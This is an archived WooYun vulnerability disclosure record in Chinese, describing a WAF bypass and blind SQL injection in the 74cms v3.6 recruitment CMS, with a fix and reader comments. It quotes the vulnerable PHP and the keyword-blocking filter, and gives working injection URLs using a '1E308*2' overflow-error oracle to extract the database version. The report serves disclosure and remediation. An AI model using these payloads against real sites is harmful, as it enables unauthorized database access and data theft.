{"id": 82731, "wybug_id": "wooyun-2015-0150114", "wybug_title": "74cms waf绕过&amp;SQL注入漏洞(获取部分数据)", "wybug_corp": "74cms.com", "wybug_author": "xiao.k", "wybug_date": "2015-10-29 10:09", "wybug_open_date": "2016-02-01 10:10", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "漏洞已经通知厂商但是厂商忽略漏洞", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["源码审核", "注射漏洞利用技巧", "源码分析"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-10-29：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-11-03：\t厂商主动忽略漏洞，细节向第三方安全合作伙伴开放（绿盟科技、唐朝安全巡航）\t\t\t\t\t\t\t\t\t2015-12-28：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2016-01-07：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2016-01-17：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2016-02-01：\t细节向公众公开  简要描述： 所谓SQL注入，就是通过把SQL命令插入到Web表单提交或输入域名或页面请求的查询字符串，最终达到欺骗服务器执行恶意的SQL命令。具体来说，它是利用现有应用程序，将（恶意）的SQL命令注入到后台数据库引擎执行的能力，它可以通过在Web表单中输入（恶意）SQL语句得到一个存在安全漏洞的网站上的数据库，而不是按照设计者意图去执行SQL语句。 详细说明：  有问题的代码位于`user\\company\\company_common.php`\n<?php\tdefine('IN_QISHI', true);\trequire_once(dirname(__FILE__).'/company_common.php');\t$smarty->assign('leftmenu',\"recruitment\");\t//获取y_id并赋值给$id\t$id =!empty($_REQUEST['y_id'])?$_REQUEST['y_id']:showmsg(\"你没有选择简历！\",1);\tif (is_array($id))\t{\t\t// 已下载的简历 批量导出为word  先查询简历id  \t\t$sqlin=implode(\",\",$id);\t\t//以逗号分割内容，并未加单引号做限制，也未进行任何过滤。\t\t$idarr = $db->getall(\"select resume_id from \".table('company_down_resume').\" where did IN ({$sqlin})\");\t\tforeach ($idarr as $key=>$value) {\t\t\t$idarr[$key]=$value['resume_id'];\t\t}\t\t$id=$idarr;\t}\telse\t{\t\t$id=array($id);\t}\t$sqlin=implode(\",\",$id);\t//在这里做了一次过滤，但是已经错过了时机。\tif (!preg_match(\"/^(\\d{1,10},)*(\\d{1,10})$/\",$sqlin)) return false;\t$rsume_sql = \"select * from \".table('resume').\" where id IN ({$sqlin}) \";\t$result=$db->getall($rsume_sql);\n74cms在进入sql执行之前，还经过一次语句检测。\nstatic function CheckSql($db_string,$querytype='select')    {        global $QS_pwdhash;        $clean = '';        $error='';        $old_pos = 0;        $pos = -1;        $log_file = QISHI_ROOT_PATH.'/data/'.md5($QS_pwdhash).'_safe.txt';        $userIP = getip();        $getUrl =request_url();        $time = date('Y-m-d H:i:s');        if($querytype=='select')        {            $notallow1 = \"[^0-9a-z@\\._-]{1,}(sleep|benchmark|load_file|outfile)[^0-9a-z@\\.-]{1,}\";            if(preg_match(\"/\".$notallow1.\"/i\", $db_string))            {                fputs(fopen($log_file,'a+'),\"$userIP||$time\\r\\n$getUrl\\r\\n$db_string\\r\\nSelectBreak\\r\\n===========\\r\\n\");                exit(\"您输入的内容不符合要求请正确输入！\");            }        }        //完整的SQL检查        while (TRUE)        {            $pos = strpos($db_string, '\\'', $pos + 1);            if ($pos === FALSE)            {                break;            }            $clean .= substr($db_string, $old_pos, $pos - $old_pos);            while (TRUE)            {                $pos1 = strpos($db_string, '\\'', $pos + 1);                $pos2 = strpos($db_string, '\\\\', $pos + 1);                if ($pos1 === FALSE)                {                    break;                }                elseif ($pos2 == FALSE || $pos2 > $pos1)                {                    $pos = $pos1;                    break;                }                $pos = $pos2 + 1;            }            $clean .= '$s$';            $old_pos = $pos + 1;        }        $clean .= substr($db_string, $old_pos);        $clean = trim(strtolower(preg_replace(array('~\\s+~s' ), array(' '), $clean)));        if (strpos($clean, '@') !== FALSE  OR strpos($clean,'char(')!== FALSE OR strpos($clean,'\"')!== FALSE         OR strpos($clean,'$s$$s$')!== FALSE)        {            $fail = TRUE;            if(preg_match(\"#^create table#i\",$clean)) $fail = FALSE;            $error=\"unusual character\";        }        elseif (strpos($clean, '/*') > 2 || strpos($clean, '--') !== FALSE || strpos($clean, '#') !== FALSE)        {            $fail = TRUE;            $error=\"comment detect\";        }        elseif (strpos($clean, 'sleep') !== FALSE && preg_match('~(^|[^a-z])sleep($|[^[a-z])~is', $clean) != 0)        {            $fail = TRUE;            $error=\"slown down detect\";        }        elseif (strpos($clean, 'benchmark') !== FALSE && preg_match('~(^|[^a-z])benchmark($|[^[a-z])~is', $clean) != 0)        {            $fail = TRUE;            $error=\"slown down detect\";        }        elseif (strpos($clean, 'load_file') !== FALSE && preg_match('~(^|[^a-z])load_file($|[^[a-z])~is', $clean) != 0)        {            $fail = TRUE;            $error=\"file fun detect\";        }        elseif (strpos($clean, 'into outfile') !== FALSE && preg_match('~(^|[^a-z])into\\s+outfile($|[^[a-z])~is', $clean) != 0)        {            $fail = TRUE;            $error=\"file fun detect\";        }        if (!empty($fail))        {            fputs(fopen($log_file,'a+'),\"$userIP||$time\\r\\n$getUrl\\r\\n$db_string\\r\\n$error\\r\\n===========\\r\\n\");            exit(\"您输入的内容不符合要求请正确输入！\");        }        else        {            return $db_string;        }    }\n这段代码主要是检查语句是否合法，是否有注入的情况。并且着重检测了 **sleep、benchmark、load_file、outfile** ，主要是防止盲注入。盲注大体分为三种形式：第一种：根据页面的差异性猜解数据。比较常见的例如二分法猜解第二种：根据页面的返回时间长短进行判断。第三种：根据页面的报错内容，进行返回数据。第一种方法，此方法利用起来有限制，因为如果要利用这个代码。最终会被下方语句检查到，最终返回一个空白页面。不论执行成功还是失败，都会显示空白页面。\t \nif (!preg_match(\"/^(\\d{1,10},)*(\\d{1,10})$/\",$sqlin)) return false;\n第二种方法，上方的CheckSql函数已经把第二种方式否决了。第三种方法，由于程序已经屏蔽了sql语句的错误内容，仅提示如下内容。那么第三种方法也无法利用。 \nError：Query error:错误的sql语句\n在这里我们需要找寻一个新的方式完成注入。根据上方的代码，我们的思路如下：当我们的猜解语句为真时，页面返回空白。也就是被下方的`preg_match`截断。如果我们的猜解语句为假时，抛出异常。这里我选用的是 `1E308*2`这个技巧。当值过大时，mysql会抛出异常。最终构造的sql语句为 \nselect resume_id from qs_company_down_resume where did IN (1,2) or IF( ord(mid(version(),1,1)) = 50 ,1，1E308*2) and (1,2) = (1,2);\n当 `ord(mid(version(),1,1)) = 50`执行结果为真时，IF语句会执行到第二个参数，也就是 1， 页面返回空白。当执行结果为假时，IF语句会执行到第三个参数，触发`1E308*2`报错。   漏洞证明：  在此演示下获取数据库的version\n\n当提交**.**.**.**/official/74cms_v3.6_20150923/74cms_v3.6_20150923/upload/user/company/company_resume_doc.php?y_id[]=2)%20or%20IF(%20ord(mid(version(),1,1))=48,1E308*2,1)%20and%20(1,2)%20=%20(1&y_id[]=2是页面为空当提交**.**.**.**/official/74cms_v3.6_20150923/74cms_v3.6_20150923/upload/user/company/company_resume_doc.php?y_id[]=2)%20or%20IF(ord(mid(version(),1,1))=49,1E308*2,1)%20and%20(1,2)%20=%20(1&y_id[]=2页面提示如下Error：Query error:select resume_id from qs_company_down_resume where did IN (2) or IF(ord(mid(version(),1,1))=49,1E308*2,1) and (1,2) = (1,2)当提交**.**.**.**/official/74cms_v3.6_20150923/74cms_v3.6_20150923/upload/user/company/company_resume_doc.php?y_id[]=2)%20or%20IF(ord(mid(version(),1,1))=50,1E308*2,1)%20and%20(1,2)%20=%20(1&y_id[]=2页面再次为空说明version的第一位的ASCII为 49 ，与之前提到的数据相符。   修复方案：  将正则判断语句提前，放到以下语句之前\t$idarr = $db->getall(\"select resume_id from \".table('company_down_resume').\" where did IN ({$sqlin})\");   版权声明：转载请注明来源 xiao.k@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：无影响厂商忽略 忽略时间：2016-02-01 10:10 厂商回复：  漏洞Rank：4  (WooYun评价) 最新状态： 暂无  ", "replys": "漏洞评价：\n评价\n     2015-10-29 23:05 |    \t\t不能忍 \t\t\t( 实习白帽子  |\t\t\t        Rank:80 漏洞数:41        | 要是能重来，我要选李白!)\t\t \n  T.T  大牛你好厉害。我能认识你么？能给个扣扣的么？    \n     2015-10-29 23:10 |    \t\txiao.k \t\t\t( 普通白帽子  |\t\t\t        Rank:157 漏洞数:16        | 纳威网络安全导航 navisec.it)\t\t \n  @不能忍 本人不收徒，不接单，不借钱，不卖任何东西...    \n     2015-10-29 23:18 |    \t\t不能忍 \t\t\t( 实习白帽子  |\t\t\t        Rank:80 漏洞数:41        | 要是能重来，我要选李白!)\t\t \n  @xiao.k 学习而已    \n  \n\n\n", "wybug_level_fromcorp": "无影响厂商忽略", "wybug_rank_fromcorp": 0, "Ranks": null}